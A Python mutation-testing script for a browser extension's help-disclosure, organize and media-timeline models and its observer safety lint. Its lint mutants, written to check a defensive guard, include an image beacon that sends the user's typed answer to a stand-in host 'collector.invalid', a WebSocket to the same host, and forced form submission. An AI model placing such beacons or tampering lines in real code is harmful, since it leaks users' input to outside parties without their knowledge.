#!/usr/bin/env python3
"""P0-12 web mutation runs (test-only models and the observer lint guard).

Each mutant changes exactly one place in a temporary copy of the module files and runs the
unchanged test file with Node's test runner. An unmutated control runs first. Results go to
<out>/<family>.json with, per mutant: id, description, file, killed, and the failing tests.

Usage (from the repository root, foreground, no network or browser):
  python3 docs/verification/web/evidence/p0-12-mutations/run_mutations.py [family ...]
Families: disclosure, organize, timeline, lint (default: all).
Environment: NODE (default: the lead's pinned Node 24), OUT (default: this directory).
"""
import json
import os
import shutil
import subprocess
import sys
import tempfile

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..', '..', '..', '..'))
MODULE = os.path.join(ROOT, 'apps', 'safari-extension')
NODE = os.environ.get('NODE', '/home/agentsdock/Projects/learning-companion/repo/.tools/node-v24.21.0-linux-x64/bin/node')
OUT = os.environ.get('OUT', os.path.dirname(os.path.abspath(__file__)))

DM = 'tests/p0-12/disclosure-model.ts'
OM = 'tests/p0-12/organize-model.ts'
MT = 'tests/p0-12/media-timeline.ts'
EO = 'fixture/src/entry-observer.ts'

BF = """    case 'backfilled_request':
      // It cannot open help, restore closed or stale permission, or resolve an unsynced
      // close. If it still matters, the user is asked and can request again.
      return ctx;
"""


def bf(body):
    return (BF, "    case 'backfilled_request':\n      return " + body + ";\n")


DISCLOSURE = [
    # Gate and cache rules.
    ('exceeds_permission', 'item above request or permission level allowed', "return no('exceeds_permission');", '{}'),
    ('stale_revision', 'help from an older revision allowed', "return no('stale_revision');", '{}'),
    ('stale_remote_permission', "another device's permission used while disconnected", "if (req.origin !== 'this_device') return no('stale_remote_permission');", ''),
    ('unrequested_disclosure', 'unrequested content may disclose', "return rank(item.level) === 0 ? { present: true, reason: 'non_disclosing_status' } : no('unrequested_disclosure');", "return { present: true, reason: 'x' };"),
    ('derivative_label', 'derivative labeled below its source allowed', "return no('derivative_labeled_below_source');", '{}'),
    ('cache_exact_level', 'higher cached level answers a lower request', 'c.level === request.level &&', 'rank(c.level) >= rank(request.level) &&'),
    ('cache_revision', 'cache ignores the revision', '(c.basisRevision === null ? rank(c.level) === 0 : c.basisRevision === ctx.attemptRevision) &&', 'true &&'),
    ('cache_problem_version', 'cache ignores the problem version', '      c.problemVersion === ctx.problemVersion &&\n      c.attemptId', '      true &&\n      c.attemptId'),
    ('cache_scope', 'cache ignores the step scope', 'c.scope === request.scope &&', 'true &&'),
    ('cache_preference', 'cache ignores the language/preference', "c.preferenceKey === preferenceKey(ctx) &&\n      // A derivative", "true &&\n      // A derivative"),
    ('cache_derivative', 'cache serves a derivative of higher content (QA P012-D8)', 'c.derivedFrom.every((l) => rank(l) <= rank(c.level)) &&', 'true &&'),
    ('cache_serves_voice', 'cache serves voice segments (QA MD)', "      c.channel !== 'voice',\n", '      true,\n'),
    ('scope_rule', 'step check admits content about other steps', "if (req.scope !== null && rank(item.level) > 0 && item.scope !== req.scope) return no('outside_checked_step');", ''),
    ('scope_only_step_items', 'step scope applied to step_check items only (QA MJ)', 'if (req.scope !== null && rank(item.level) > 0 && item.scope !== req.scope)', "if (req.scope !== null && item.level === 'step_check' && item.scope !== req.scope)"),
    ('request_other_attempt', 'no other-attempt check on the request (QA MK)', "if (req.problemId !== ctx.problemId || req.problemVersion !== ctx.problemVersion || req.attemptId !== ctx.attemptId) return no('request_for_another_attempt');", ''),
    ('item_above_request', 'only the permission bound checked (QA ME)', 'if (rank(item.level) > rank(req.level) || rank(item.level) > rank(ctx.permission.level))', 'if (rank(item.level) > rank(ctx.permission.level))'),
    ('item_above_permission', 'only the request bound checked (QA MF)', 'if (rank(item.level) > rank(req.level) || rank(item.level) > rank(ctx.permission.level))', 'if (rank(item.level) > rank(req.level))'),
    ('offline_voice_threshold', 'offline voice threshold off by one (QA MC)', 'rank(item.level) >= rank(HIGH_VOICE)', 'rank(item.level) > rank(HIGH_VOICE)'),
    ('null_basis_disclosure', 'revision-less help allowed', "if (item.basisRevision === null ? rank(item.level) > 0 : item.basisRevision !== ctx.attemptRevision) return no('stale_revision');", "if (item.basisRevision !== null && item.basisRevision !== ctx.attemptRevision) return no('stale_revision');"),
    ('generic_previews', 'previews may disclose', "if (item.channel === 'notification' && rank(item.level) > 0) return no('preview_must_be_generic');", ''),
    ('voice_silent', 'voice outside a voice discussion', "if (item.channel === 'voice' && ctx.voiceMode !== 'discussion') return no('silent_mode');", ''),
    # Intents and acknowledgement (QA P012-D1/D2/D3/D5 and the internal review of 7ee1217).
    ('connected_close_not_pending', 'a connected close is not pending (QA P012-D1)', "return supersede(closed(ctx), { kind: 'close', madeAt: ctx.policyVersion });", "return ctx.sync === 'fresh' ? closed(ctx) : supersede(closed(ctx), { kind: 'close', madeAt: ctx.policyVersion });"),
    ('connected_request_not_pending', 'a connected request is not pending (QA S1c)', 'return supersede(withRequest(ctx, e.request, provisional), intent);', 'return provisional ? supersede(withRequest(ctx, e.request, provisional), intent) : withRequest(ctx, e.request, provisional);'),
    ('equal_version_acks', 'an equal-version snapshot acknowledges (review safety-01)', 'if (s.policyVersion <= applied) return pending;', 'if (s.policyVersion < applied) return pending;'),
    ('stale_acks_count', 'an older snapshot acknowledges', '  if (!newer) return ctx;\n  const pending = unacknowledged(ctx.pending, s, ctx.policyVersion);', '  if (!newer) return { ...ctx, pending: unacknowledged(ctx.pending, s, -1) };\n  const pending = unacknowledged(ctx.pending, s, ctx.policyVersion);'),
    ('close_flag_covers_later_close', 'the close flag acknowledges every close (review safety-02)', "    for (let k = through + 1; k < pending.length && pending[k]!.kind === 'close'; k++) through = k;", "    pending.forEach((i, k) => { if (i.kind === 'close') through = Math.max(through, k); });"),
    ('close_flag_acks_requests', 'the close flag also acknowledges requests', "k < pending.length && pending[k]!.kind === 'close'; k++", 'k < pending.length; k++'),
    ('no_echo_ack', 'an echo does not acknowledge (QA P012-D5a)', ' || s.request?.id === i.id)) through = k;', ')) through = k;'),
    ('no_accepted_ack', 'acceptance does not acknowledge', '(s.accepted.includes(i.id) || s.request?.id === i.id)', '(s.request?.id === i.id)'),
    ('no_prefix_ack', 'acknowledging a request leaves earlier intents pending', 'return pending.slice(through + 1);', 'return pending.filter((_, i) => i !== through);'),
    ('no_restriction', 'a newer unacknowledged snapshot changes nothing', 'return s.policyVersion > last.madeAt ? restrictTo(next, s) : next;', 'return next;'),
    ('unacked_snapshot_replaces_local', 'a newer unacknowledged snapshot replaces the pending intent (QA P012-D1)', 'return s.policyVersion > last.madeAt ? restrictTo(next, s) : next;', 'return showServer(next);'),
    ('restrict_by_known_older', 'a known-older snapshot restricts', 'return s.policyVersion > last.madeAt ? restrictTo(next, s) : next;', 'return restrictTo(next, s);'),
    ('restrict_widens', 'restriction takes any other level', 'if (!local || rank(s.request.level) >= rank(local.level)) return ctx;', 'if (!local || rank(s.request.level) === rank(local.level)) return ctx;'),
    ('restrict_raises_local_level', 'a snapshot raises the pending request level (QA MA)', 'if (!local || rank(s.request.level) >= rank(local.level)) return ctx;', 'if (!local) return ctx;\n  if (rank(s.request.level) >= rank(local.level)) return { ...ctx, permission: { level: s.request.level, scope: s.request.scope }, activeRequest: { ...local, level: s.request.level, scope: s.request.scope } };'),
    ('restrict_ignores_scope', 'restriction widens a step check (review safety-03)', 'return withinScope(s.request, local.scope) ? ', 'return true ? '),
    ('server_close_keeps_remote', 'a server close keeps a lowered remote request (review A43)', "  if (!s.request) return { ...closed(ctx), teaching: s.teaching };\n  if (ctx.retired", "  if (!s.request) return ctx.activeRequest?.origin === 'other_device' ? ctx : { ...closed(ctx), teaching: s.teaching };\n  if (ctx.retired"),
    ('retired_revived', 'a superseded request comes back (review oracle-02)', 'const live = (ctx: Context, r: RequestInput | null): RequestInput | null => (r && !ctx.retired.includes(r.id) ? r : null);', 'const live = (_ctx: Context, r: RequestInput | null): RequestInput | null => r;'),
    ('retired_stale_closes', 'a stale snapshot naming a superseded request closes help', 'if (ctx.retired.includes(s.request.id)) return ctx;', 'if (ctx.retired.includes(s.request.id)) return closed(ctx);'),
    ('no_supersede', 'intents retire nothing (rule 7)', "    retired: union(ctx.retired, ctx.seen.filter((id) => id !== own)),", '    retired: ctx.retired,'),
    ('acked_own_request_escalated', 'an acknowledged own request escalates (QA MB)', 'return r ? { ...withRequest(ctx, r, false), teaching: ctx.server.teaching }', "return r ? { ...withRequest(ctx, r.origin === 'this_device' ? { ...r, level: 'full_solution' as Level } : r, false), teaching: ctx.server.teaching }"),
    ('accepted_keeps_local', 'accepted is treated as current (QA P012-D2)', '  if (!last) return showServer(next);', '  if (!last) return next.activeRequest ? next : showServer(next);'),
    ('no_drop_at_reconnect', 'offline requests stay answered after reconnect', '      return dropUnaccepted(received);', '      return received;'),
    ('dropped_still_answered', 'a dropped request is still answered', '  return last?.kind === \'request\' && !last.answerable ? capServer(next) : next;', '  return next;'),
    ('drop_connected_requests_too', 'connected requests are dropped too', "(i.kind === 'request' && i.provisional ? ", "(i.kind === 'request' ? "),
    ('no_drop_left_attempts', 'left attempts keep answerable offline requests (review safety-05)', '  const saved = Object.fromEntries(Object.entries(ctx.saved).map(([k, m]) => [k, { ...m, pending: dropped(m.pending) }]));', '  const saved = ctx.saved;'),
    ('drop_closes_instead_of_cap', 'a dropped request closes instead of capping (review A03)', '? capServer(next) : next;', '? closed(next) : next;'),
    ('cap_only_latest', 'the cap uses only the dropped request (review safety-04)', 'ctx.pending.every((i) =>', 'ctx.pending.slice(-1).every((i) =>'),
    ('cap_ignores_level', 'the cap ignores levels', 'rank(r.level) <= rank(i.level) && withinScope(r, i.scope)', 'withinScope(r, i.scope)'),
    ('cap_at_level_blocked', 'the cap blocks its own level (review A01)', 'rank(r.level) <= rank(i.level) && withinScope(r, i.scope)', 'rank(r.level) < rank(i.level) && withinScope(r, i.scope)'),
    ('cap_ignores_scope', 'the cap ignores the step scope (review safety-03)', 'rank(r.level) <= rank(i.level) && withinScope(r, i.scope)', 'rank(r.level) <= rank(i.level)'),
    ('cap_shows_own_unacked_id', 'the cap shows a snapshot naming an unacknowledged own request', 'const fits = r !== null && !mine &&', 'const fits = r !== null &&'),
    ('foreign_reconnect_not_stale', 'a reconnect for another attempt keeps stale remote help (review safety-06)', ': staleServer(acknowledgeSaved(fresh, e.binding, s));', ': acknowledgeSaved(fresh, e.binding, s);'),
    ('no_saved_acks', 'acknowledgements while away are dropped (QA P012-D5b)', '  if (!m) return ctx;\n  const seen = s.request ? union(m.seen', '  if (!m || true) return ctx;\n  const seen = s.request ? union(m.seen'),
    ('saved_acks_ignore_version', 'acknowledgements while away ignore version order (review A18)', 'pending: unacknowledged(m.pending, s, m.policyVersion), seen', 'pending: unacknowledged(m.pending, s, -1), seen'),
    ('reconnect_foreign_acks_dropped', 'reconnect acknowledgements for a left attempt dropped (review A10)', ': staleServer(acknowledgeSaved(fresh, e.binding, s));', ': staleServer(fresh);'),
    ('resync_foreign_acks_dropped', 'resync acknowledgements for a left attempt dropped (review A11)', ': acknowledgeSaved(fresh, e.binding, s);\n', ': fresh;\n'),
    ('foreign_policy_applied_here', 'a policy for another attempt applies here', "if (!sameBinding(e.binding, bindingOf(ctx))) return acknowledgeSaved(ctx, e.binding, s);", "if (!sameBinding(e.binding, bindingOf(ctx))) return receive(ctx, s, e.policyVersion > ctx.policyVersion);"),
    ('pending_lost_on_switch', 'pending intents lost when leaving an attempt', 'pending: back?.pending ?? [],', 'pending: [],'),
    ('retired_lost_on_switch', 'superseded requests forgotten when leaving an attempt', 'retired: back?.retired ?? [],', 'retired: [],'),
    ('version_lost_on_switch', 'policy version lost when leaving an attempt', 'policyVersion: back?.policyVersion ?? 0,', 'policyVersion: 0,'),
    ('same_version_reconnect_ignored', 'an equal-version reconnect is ignored', 'receive(fresh, s, e.policyVersion >= ctx.policyVersion)', 'receive(fresh, s, e.policyVersion > ctx.policyVersion)'),
    ('resync_accepts_equal_version', 'a connected resync accepts an equal version', 'matches ? receive(fresh, s, e.policyVersion > ctx.policyVersion)', 'matches ? receive(fresh, s, e.policyVersion >= ctx.policyVersion)'),
    ('remote_while_disconnected', 'remote policy applied while disconnected', "      if (ctx.sync !== 'fresh') return ctx;\n      const s: Snapshot = { ...e, accepted: e.acceptedRequests", "      const s: Snapshot = { ...e, accepted: e.acceptedRequests"),
    # AUDIO-14 backfilled transcript requests.
    ('backfill_live_request', 'a backfilled request becomes live', *bf("apply(ctx, { type: 'request', request: e.request })")),
    ('backfill_resolves_pending', 'a backfilled request resolves pending intents', *bf('{ ...ctx, pending: [] }')),
    ('backfill_restores_closed_help', 'a backfilled request restores closed help', *bf('ctx.activeRequest ? ctx : withRequest(ctx, e.request, false)')),
    ('backfill_escalates_open_help', 'a backfilled request escalates open help', *bf('ctx.activeRequest ? withRequest(ctx, e.request, false) : ctx')),
    ('backfill_live_when_offline', 'a backfilled request is live while offline', *bf("ctx.sync === 'fresh' ? ctx : withRequest(ctx, e.request, true)")),
]
EQUIVALENT = {
    'request_other_attempt': 'an active request is always bound to the current attempt, and switching attempts closes help',
    'item_above_request': 'permission is only ever set together with the active request, to its level',
    'item_above_permission': 'permission is only ever set together with the active request, to its level',
}

ORGANIZE = [
    ('unknown_reported_shared', 'an unknown outcome counts as shared (QA ORG-11, N3)', "everShared: attempts.some((a) => a === 'shared_pending_import' || a === 'imported'),", "everShared: attempts.some((a) => a === 'shared_pending_import' || a === 'imported' || a === 'dispatch_unknown'),"),
    ('layout_skips_disclosure', 'layout layers skip the disclosure check (QA ORG-10, N5)', 'if (!l.permittedNow) reasons.push', "if (!l.permittedNow && l.kind !== 'layout') reasons.push"),
    ('correction_skips_disclosure', 'correction layers skip the disclosure check (QA ORG-10, N6)', 'if (!l.permittedNow) reasons.push', "if (!l.permittedNow && l.kind !== 'correction') reasons.push"),
    ('layout_skips_preview', 'layout layers skip the preview (QA ORG-10, N7)', 'if (c && !c.previewedAiLayerIds.includes(l.id)) reasons.push', "if (c && l.kind !== 'layout' && !c.previewedAiLayerIds.includes(l.id)) reasons.push"),
    ('completed_needs_local_start', 'a delivery report needs a local dispatch start (QA ORG-3)', "      case 'dispatch_completed':\n        raise('shared_pending_import');", "      case 'dispatch_completed':\n        if (cur === 'dispatching' || cur === 'dispatch_unknown') set('shared_pending_import');"),
    ('start_ignored_after_cancel', 'a dispatch start after a cancel is ignored (QA ORG-3)', "        if (cur === 'effect_unverified') set('dispatching');\n        else raise('dispatching');", "        if (cur !== undefined && PRE_DISPATCH.has(cur)) set('dispatching');"),
    ('unchained_import_discarded', 'an unchained import report is discarded (QA ORG-3)', "        else raise('effect_unverified');", ''),
    ('unchained_import_accepted', 'an unchained import report counts as imported', "        else raise('effect_unverified');", "        else raise('imported');"),
    ('unverified_not_exposure', 'an unverified effect is not an exposure', 'everExternalEffect: attempts.some((a) => EFFECT[a] > 0),', 'everExternalEffect: attempts.some((a) => DISPATCHED.has(a)),'),
    ('unverified_chains_import', 'an unverified report chains a later import', "const DISPATCHED: ReadonlySet<AttemptState> = new Set(['dispatching', 'shared_pending_import', 'dispatch_unknown', 'imported']);", "const DISPATCHED: ReadonlySet<AttemptState> = new Set(['dispatching', 'shared_pending_import', 'dispatch_unknown', 'imported', 'effect_unverified']);"),
    ('unverified_hides_dispatch', 'dispatch evidence after an unverified report is ignored (review -5)', "        if (cur === 'effect_unverified') set('dispatching');\n        else raise('dispatching');", "        raise('dispatching');"),
    ('raise_may_lower', 'evidence may lower an outcome', 'else if (EFFECT[st] > EFFECT[cur]) set(st);', 'else set(st);'),
    ('completed_lowers_import', 'a late delivery report lowers an import (review M1)', "      case 'dispatch_completed':\n        raise('shared_pending_import');", "      case 'dispatch_completed':\n        if (cur === undefined) attempts.push('shared_pending_import');\n        else set('shared_pending_import');"),
    ('unknown_lowers_shared', 'a late unknown outcome lowers a delivery (review M2)', "        else raise('dispatch_unknown');", "        else if (cur === undefined) attempts.push('dispatch_unknown');\n        else set('dispatch_unknown');"),
    ('timeout_lowers_outcome', 'a timeout lowers a delivered or imported outcome (review M3)', "      case 'no_response':\n        // A generic timeout creates no effect; after a dispatch start the outcome becomes unknown.\n        if (cur === 'dispatching') set('dispatch_unknown');", "      case 'no_response':\n        if (cur !== undefined && DISPATCHED.has(cur)) set('dispatch_unknown');"),
    ('timeout_manufactures_effect', 'a timeout without dispatch creates an effect', "      case 'no_response':\n        // A generic timeout creates no effect; after a dispatch start the outcome becomes unknown.\n        if (cur === 'dispatching') set('dispatch_unknown');", "      case 'no_response':\n        raise('dispatch_unknown');"),
    ('late_cancel_erases_unverified', 'a late cancel erases an unverified effect (review M5)', "const PRE_DISPATCH: ReadonlySet<AttemptState> = new Set(['prepared', 'panel_open']);", "const PRE_DISPATCH: ReadonlySet<AttemptState> = new Set(['prepared', 'panel_open', 'effect_unverified']);"),
    ('unverified_not_ended', 'an unverified effect does not end its attempt (review M7)', "const ENDED: ReadonlySet<AttemptState> = new Set(['cancelled', 'failed_before_dispatch', 'shared_pending_import', 'dispatch_unknown', 'imported', 'effect_unverified']);", "const ENDED: ReadonlySet<AttemptState> = new Set(['cancelled', 'failed_before_dispatch', 'shared_pending_import', 'dispatch_unknown', 'imported']);"),
    ('late_cancel_resolves_unknown', 'a late cancel resolves an unknown outcome (QA ORG-12)', "        if (cur !== undefined && PRE_DISPATCH.has(cur)) set('cancelled');", "        if (cur !== undefined && (PRE_DISPATCH.has(cur) || cur === 'dispatch_unknown')) set('cancelled');"),
    ('submit_option_offered', 'a submit option is offered (QA ORG-13)', "  out.push('preview', 'not_now');", "  if (c.homeworkDocument === 'none') out.push('submit_homework');\n  out.push('preview', 'not_now');"),
    ('correction_layout_consent', 'layout-only consent covers a correction', "if (l.kind === 'correction' && c?.scope !== 'content')", 'if (false)'),
    ('single_prompt_slot', 'another question resets the prompt state (QA ORG-1)', '  const q = state.questions[problemId] ?? { shown: null, refusals: [], superseded: [] };', "  const q = Object.keys(state.questions).at(-1) === problemId ? state.questions[problemId]! : { shown: null, refusals: [], superseded: [] };"),
    ('delayed_refusal_hits_current', 'a delayed refusal is recorded on the latest question (QA ORG-1)', '  const k = questionOf(state, promptId);', '  const k = Object.keys(state.questions).at(-1);'),
    ('refusal_of_unshown_prompt', 'a refusal of a prompt never shown is recorded', '  if (!k || !q || q.superseded.includes(refusalId) || q.refusals.includes(refusalId)) return state;', '  if (!k || !q) return state;'),
    ('refusal_replay_revives', 'a replayed superseded refusal comes back (review -6)', 'q.superseded.includes(refusalId) || ', ''),
    ('reopen_ignores_unseen_refusal', 'a reopen supersedes refusals it did not see (review -6)', 'if (!q.refusals.every((r) => sawRefusals.includes(r))) return { allowed: false, state };', 'if (!q.refusals.some((r) => sawRefusals.includes(r))) return { allowed: false, state };'),
    ('reopen_ignores_causality', 'any reopen supersedes (QA ORG-1)', '  if (!q.refusals.every((r) => sawRefusals.includes(r))) return { allowed: false, state };\n', ''),
    ('reopen_keeps_refusal', 'a causal reopen leaves the refusal in force (review M6)', 'return { allowed: true, state: { ...state, questions: { ...state.questions, [problemId]: { ...q, refusals: [], superseded: [...q.superseded, ...q.refusals] } } } };', 'return { allowed: true, state };'),
    ('ai_overrides_user_purpose', 'a later AI classification replaces the user purpose (QA ORG-9)', '  if (lastUser >= 0) {', '  if (false) {'),
    ('disagreement_not_asked', 'a differing AI suggestion is not asked about (QA ORG-9)', 'clarify: c.confident && c.purpose !== s.purpose && !askedAlready };', 'clarify: false };'),
    ('same_suggestion_asked_again', 'the same AI suggestion is asked about again (review -9)', 'clarify: c.confident && c.purpose !== s.purpose && !askedAlready };', 'clarify: c.confident && c.purpose !== s.purpose };'),
]

TIMELINE = [
    ('seek_closed_by_any_event', 'a seek closes on any event', "e.kind === 'seeking' ? true : e.kind === 'seeked' || e.kind === 'coverage_lost' ? false : undefined", "e.kind === 'seeking'"),
    ('ignore_seeking_attr', 'the seeking attribute is ignored', 'if (seekOpen || state.seeking) return', 'if (seekOpen) return'),
    ('tie_first_pick', 'an unordered tie takes the first item', "return values.every((v) => same(v, values[0]!)) ? values[0] : 'conflict';", 'return values[0];'),
    ('tie_last_pick', 'an unordered tie takes the last item', "return values.every((v) => same(v, values[0]!)) ? values[0] : 'conflict';", 'return values.at(-1);'),
    ('partial_seq_order', 'a partial seq counts as an order', 'const ordered = seqs.every((q) => Number.isFinite(q)) && new Set(seqs).size === items.length;', 'const ordered = seqs.some((q) => Number.isFinite(q)) && new Set(seqs).size === items.length;'),
    ('shared_seq_order', 'a shared seq counts as an order', ' && new Set(seqs).size === items.length;', ';'),
    ('nan_seq_order', 'a non-finite seq counts as an order', 'seqs.every((q) => Number.isFinite(q))', 'seqs.every((q) => q !== undefined)'),
    ('no_dedupe', 'redeliveries are not deduplicated', 'const items = [...new Map(group.map((x) => [contentKey(x), x] as const)).entries()]', 'const items = [...group.map((x, i) => [contentKey(x) + i, x] as const)]'),
    ('coverage_ignored', 'coverage loss ignored', "(e.kind === 'coverage_lost' ? 'lost' : e)", "(e.kind === 'coverage_lost' ? undefined : e)"),
    ('no_seek_reset_on_loss', 'a gap does not reset the seek', "e.kind === 'seeked' || e.kind === 'coverage_lost' ? false", "e.kind === 'seeked' ? false"),
    ('pause_exempt_freshness', 'a pause is held without heartbeats', 'if (t - state.at > MAX_EXTRAPOLATION_MS) return', 'if (t - state.at > MAX_EXTRAPOLATION_MS && !state.paused) return'),
    ('frame_coverage_ignored', 'frames ignore coverage loss', 'const lostSince = coverageLostAt.some((g) => g >= frame.capturedAt && g <= t);', 'const lostSince = false;'),
    ('loss_at_frame_time_before', 'a loss at the frame time counts as before it', 'g >= frame.capturedAt && g <= t', 'g > frame.capturedAt && g <= t'),
    ('loss_at_t_ignored', 'a loss at the utterance time is ignored', 'g >= frame.capturedAt && g <= t', 'g >= frame.capturedAt && g < t'),
    ('later_events_used', 'later events are used', 'events.filter((e) => e.at <= t)', 'events.filter(() => true)'),
    ('later_frames_used', 'later frames are used', 'frames.filter((f) => f.capturedAt <= t)', 'frames.filter(() => true)'),
    ('no_capture_sort', 'groups not sorted by capture time', 'const times = [...new Set(items.map(at))].sort((a, b) => a - b);', 'const times = [...new Set(items.map(at))];'),
    ('exclusive_boundary_positions', 'evidence at t excluded (positions)', 'events.filter((e) => e.at <= t)', 'events.filter((e) => e.at < t)'),
    ('exclusive_boundary_frames', 'evidence at t excluded (frames)', 'frames.filter((f) => f.capturedAt <= t)', 'frames.filter((f) => f.capturedAt < t)'),
    ('frame_version_ignored', 'frame ties compare id only', '(a, b) => a.id === b.id && a.version === b.version', '(a, b) => a.id === b.id'),
    ('seeking_attr_not_in_tie', 'ties ignore the seeking attribute', ' && a.seeking === b.seeking &&', ' &&'),
    ('rate_ignored', 'the rate is ignored', '((t - state.at) / 1000) * state.rate', '((t - state.at) / 1000) * 1'),
    ('waiting_advances', 'buffering advances the position', "if (!progressing(state)) return { known: true, position: state.position, basis: 'waiting' };", ''),
    ('negative_rate_allowed', 'reverse rates extrapolate', "if (!Number.isFinite(state.rate) || state.rate < 0) return { known: false, reason: 'unsupported_rate' };", ''),
    ('stale_threshold_changed', 'the 2 s default changed', 'export const STALE_FRAME_MS = 2_000;', 'export const STALE_FRAME_MS = 3_000;'),
    ('extrapolation_changed', 'the 5 s default changed', 'export const MAX_EXTRAPOLATION_MS = 5_000;', 'export const MAX_EXTRAPOLATION_MS = 60_000;'),
    ('edits_later_used', 'later edits are used', 'return edits.filter((e) => e.at <= t);', 'return [...edits];'),
    ('edits_exclusive', 'edits at t excluded', 'return edits.filter((e) => e.at <= t);', 'return edits.filter((e) => e.at < t);'),
    ('rate_compared_when_paused', 'paused ties compare the rate', '(Object.is(a.rate, b.rate) || !progressing(a))', 'Object.is(a.rate, b.rate)'),
    ('progress_not_compared', 'ties ignore progress', ' && progressing(a) === progressing(b) &&', ' &&'),
]

# QA e26523e tests/e2e/web/p0_12_w1_review/entries-observer/mutate.mjs, verbatim, at QA's anchors.
TEXT = '    known.set(el, after);\n'
CHOICE = '      known.set(choice, after);\n'
LINT = [
    ('requestSubmit', TEXT, "    (el as HTMLInputElement).form?.requestSubmit();\n"),
    ('protoClick', CHOICE, '      HTMLElement.prototype.click.call(choice);\n'),
    ('objectAssignValue', TEXT, "    Object.assign(el, { value: '42' });\n"),
    ('bracketValue', TEXT, "    (el as HTMLInputElement)['value'] = '42';\n"),
    ('compoundValue', TEXT, "    (el as HTMLInputElement).value += '0';\n"),
    ('setAttributeChecked', CHOICE, "      choice.setAttribute('checked', '');\n"),
    ('reflectChecked', CHOICE, "      Reflect.set(choice, 'checked', !choice.checked);\n"),
    ('logicalAssignChecked', CHOICE, '      choice.checked ||= true;\n'),
    ('imageBeacon', TEXT, "    new win.Image().src = 'https://collector.invalid/?a=' + encodeURIComponent(after);\n"),
    ('webSocket', TEXT, "    new WebSocket('wss://collector.invalid').onopen = null;\n"),
    ('indexedDB', TEXT, "    win.indexedDB.open('lc-answers');\n"),
    ('blurSelect', TEXT, '    (el as HTMLInputElement).blur?.();\n'),
]

FAMILIES = {
    'disclosure': {'test': 'tests/p0-12-disclosure.test.ts', 'copy': [DM, 'tests/p0-12/disclosure-traces.json'], 'file': DM},
    'organize': {'test': 'tests/p0-12-organize.test.ts', 'copy': [OM], 'file': OM},
    'timeline': {'test': 'tests/p0-12-media-timeline.test.ts', 'copy': [MT], 'file': MT},
    'lint': {'test': 'tests/p0-12-observer-safety.test.ts', 'copy': [EO], 'file': EO},
}


def run_tests(work, test):
    p = subprocess.run([NODE, '--test', '--test-isolation=none', test], cwd=work, capture_output=True, text=True, timeout=600)
    failing = sorted({l.strip()[2:].rsplit(' (', 1)[0] for l in p.stdout.splitlines() if l.startswith('✖ ') and 'failing tests' not in l})
    return p.returncode == 0, failing


def run_family(name):
    fam = FAMILIES[name]
    work = tempfile.mkdtemp(prefix=f'lc-mut-{name}.')
    try:
        for rel in [fam['test'], *fam['copy']]:
            os.makedirs(os.path.dirname(os.path.join(work, rel)), exist_ok=True)
            shutil.copy(os.path.join(MODULE, rel), os.path.join(work, rel))
        target = os.path.join(work, fam['file'])
        original = open(target).read()
        ok, failing = run_tests(work, fam['test'])
        results = {'family': name, 'test': fam['test'], 'control': {'pass': ok, 'failing': failing}, 'mutants': []}
        if name == 'lint':
            mutants = [(mid, f'QA EO-2 insertion {mid}', anchor, anchor + line) for mid, anchor, line in LINT]
        else:
            mutants = {'disclosure': DISCLOSURE, 'organize': ORGANIZE, 'timeline': TIMELINE}[name]
        for mid, desc, old, new in mutants:
            count = original.count(old)
            if count != 1:
                results['mutants'].append({'id': mid, 'description': desc, 'error': f'anchor found {count} times'})
                continue
            open(target, 'w').write(original.replace(old, new))
            passed, failing = run_tests(work, fam['test'])
            entry = {'id': mid, 'description': desc, 'killed': not passed, 'failing_tests': failing}
            if name == 'disclosure' and mid in EQUIVALENT and passed:
                entry['equivalent'] = EQUIVALENT[mid]
            results['mutants'].append(entry)
        open(target, 'w').write(original)
        killed = sum(1 for m in results['mutants'] if m.get('killed'))
        results['summary'] = {'mutants': len(results['mutants']), 'killed': killed, 'survived': [m['id'] for m in results['mutants'] if m.get('killed') is False], 'errors': [m['id'] for m in results['mutants'] if 'error' in m]}
        with open(os.path.join(OUT, f'{name}.json'), 'w') as fh:
            json.dump(results, fh, indent=1, ensure_ascii=False)
            fh.write('\n')
        print(name, 'control', 'pass' if ok else 'FAIL', '| killed', killed, 'of', len(results['mutants']), '| survived', results['summary']['survived'], '| errors', results['summary']['errors'])
        return results
    finally:
        shutil.rmtree(work)


if __name__ == '__main__':
    for fam in sys.argv[1:] or list(FAMILIES):
        run_family(fam)
